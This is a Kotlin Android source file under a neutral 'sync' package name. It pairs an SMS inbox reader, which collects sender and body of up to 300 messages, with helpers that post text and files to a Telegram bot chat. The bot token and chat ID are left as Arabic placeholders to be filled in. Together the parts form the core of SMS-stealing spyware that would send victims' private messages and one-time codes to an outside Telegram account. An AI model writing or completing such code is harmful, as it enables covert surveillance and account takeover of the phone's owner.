package com.example.sync

import android.content.Context
import android.provider.Telephony
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.InputStream
import java.util.concurrent.TimeUnit

object Config {
    const val BOT_TOKEN = "ضع_التوكن"
    const val CHAT_ID = "ضع_الايدي"
}

object Telegram {
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(120, TimeUnit.SECONDS)
        .readTimeout(120, TimeUnit.SECONDS)
        .build()

    fun sendText(text: String): Boolean {
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", Config.CHAT_ID)
            .addFormDataPart("text", text)
            .build()
        val req = Request.Builder()
            .url("https://api.telegram.org/bot${Config.BOT_TOKEN}/sendMessage")
            .post(body).build()
        return try {
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) { false }
    }

    fun sendDocument(stream: InputStream, name: String, mime: String): Boolean {
        val bytes = stream.readBytes()
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", Config.CHAT_ID)
            .addFormDataPart("document", name, bytes.toRequestBody(mime.toMediaType()))
            .build()
        val req = Request.Builder()
            .url("https://api.telegram.org/bot${Config.BOT_TOKEN}/sendDocument")
            .post(body).build()
        return try {
            client.newCall(req).execute().use { it.isSuccessful }
        } catch (e: Exception) { false }
    }
}

object SmsReader {
    fun readAll(ctx: Context, limit: Int = 300): List<String> {
        val out = mutableListOf<String>()
        val c = ctx.contentResolver.query(
            Telephony.Sms.Inbox.CONTENT_URI,
            arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY),
            null, null, "${Telephony.Sms.DATE} DESC"
        )
        c?.use {
            val a = it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)
            val b = it.getColumnIndexOrThrow(Telephony.Sms.BODY)
            var n = 0
            while (it.moveToNext() && n < limit) {
                out.add("${it.getString(a)}: ${it.getString(b)}")
                n++
            }
        }
        return out
    }
}
